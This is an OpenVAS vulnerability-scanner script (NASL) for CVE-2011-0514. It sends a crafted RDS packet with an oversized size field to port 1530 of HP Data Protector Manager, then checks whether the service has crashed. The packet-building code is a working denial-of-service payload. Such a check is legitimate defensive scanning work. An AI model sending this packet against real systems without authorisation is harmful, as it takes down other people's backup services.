###############################################################################
# OpenVAS Vulnerability Test
# $Id: secpod_hp_data_protector_manager_rds_dos_vuln.nasl 7203 2017-09-20 13:01:39Z cfischer $
#
# HP (OpenView Storage) Data Protector Manager RDS Service Denial of Service Vulnerability
#
# Authors:
# Veerendra G.G <veerendragg@secpod.com>
#
# Copyright:
# Copyright (c) 2011 SecPod, http://www.secpod.com
#
# This program is free software; you can redistribute it and/or modify
# it under the terms of the GNU General Public License version 2
# (or any later version), as published by the Free Software Foundation.
#
# This program is distributed in the hope that it will be useful,
# but WITHOUT ANY WARRANTY; without even the implied warranty of
# MERCHANTABILITY or FITNESS FOR A PARTICULAR PURPOSE. See the
# GNU General Public License for more details.
#
# You should have received a copy of the GNU General Public License
# along with this program; if not, write to the Free Software
# Foundation, Inc., 51 Franklin St, Fifth Floor, Boston, MA 02110-1301 USA.
###############################################################################

CPE = "cpe:/a:hp:data_protector";

if(description)
{
  script_oid("1.3.6.1.4.1.25623.1.0.900291");
  script_version("$Revision: 7203 $");
  script_tag(name:"last_modification", value:"$Date: 2017-09-20 15:01:39 +0200 (Wed, 20 Sep 2017) $");
  script_tag(name:"creation_date", value:"2011-06-24 16:31:03 +0200 (Fri, 24 Jun 2011)");
  script_cve_id("CVE-2011-0514");
  script_tag(name:"cvss_base", value:"5.0");
  script_tag(name:"cvss_base_vector", value:"AV:N/AC:L/Au:N/C:N/I:N/A:P");
  script_name("HP (OpenView Storage) Data Protector Manager RDS Service Denial of Service Vulnerability");
  script_category(ACT_DENIAL);
  script_copyright("Copyright (C) 2011 SecPod");
  script_family("Denial of Service");
  script_dependencies("hp_data_protector_installed.nasl");
  script_require_ports("Services/hp_dataprotector", 5555, 1530);
  script_mandatory_keys("hp_data_protector/installed");

  script_xref(name:"URL", value:"http://xforce.iss.net/xforce/xfdb/64549");
  script_xref(name:"URL", value:"http://www.exploit-db.com/exploits/15940/");

  tag_impact = "Successful exploitation will allow attackers to cause denial of
  service condition.

  Impact Level: Application.";

  tag_affected = "HP (OpenView Storage) Data Protector Manager 6.11, Other versions may also be
  affected.";

  tag_insight = "The flaw is caused by an error in the RDS service (rds.exe) when
  processing malformed packets sent to port 1530/TCP, which could be exploited by
  remote attackers to crash an affected server.";

  tag_solution = "Upgrade to HP (OpenView Storage) Data Protector version A.06.20 or later, 
  For updates refer to,
  http://h71028.www7.hp.com/enterprise/w1/en/software/information-management-data-protector.html";

  tag_summary = "This host is installed with HP (OpenView Storage) Data Protector Manager and is prone
  to denial of service vulnerability.";

  script_tag(name:"impact", value:tag_impact);
  script_tag(name:"affected", value:tag_affected);
  script_tag(name:"insight", value:tag_insight);
  script_tag(name:"summary", value:tag_summary);
  script_tag(name:"solution", value:tag_solution);

  script_tag(name:"solution_type", value:"VendorFix");
  script_tag(name:"qod_type", value:"remote_vul");

  exit(0);
}

include("host_details.inc");

if( ! port = get_app_port( cpe:CPE ) ) exit( 0 );
get_app_location( cpe:CPE, port:port, nofork:TRUE ); # To have a reference to the Detection NVT within the GSA

## HP (OpenView Storage) Data Protector Manager default port
hpMgrPort = 1530;

## Check the port status
if( ! get_port_state( hpMgrPort ) ) exit( 0 );

##  Open tcp socket
soc1 = open_sock_tcp( hpMgrPort );
if( ! soc1 ) exit( 0 );

## Crafted packet with big data packet size
req = raw_string( 0x23, 0x8c, 0x29, 0xb6,   ## header (always the same)
                  0x64, 0x00, 0x00, 0x00,   ## data packet size (too big)
                  0x41, 0x41, 0x41, 0x41 ); ## data

## send the data
send( socket:soc1, data:req );

## wait for 2 sec
sleep( 2 );

## Close socket
close( soc1 );

## Confirm HP (OpenView Storage) Data Protector Manager alive or dead
soc2 = open_sock_tcp( hpMgrPort );
if( ! soc2 ) {
  security_message( port:port );
  exit( 0 );
}

close( soc2 );

exit( 99 );